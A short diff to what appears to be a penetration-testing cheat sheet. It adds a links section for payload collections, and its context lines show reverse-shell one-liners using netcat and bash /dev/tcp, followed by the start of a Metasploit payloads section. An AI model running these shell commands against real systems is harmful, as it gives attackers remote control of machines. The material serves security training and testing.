@@ -727,6 +727,10 @@ nc -nv <ip> <port> -e cmd.exe
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
 
+### Useful Links
+- https://github.com/swisskyrepo/PayloadsAllTheThings
+- https://www.revshells.com/
+
 ## MSF Payloads and Listeners
 [<< Index](#Index)
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
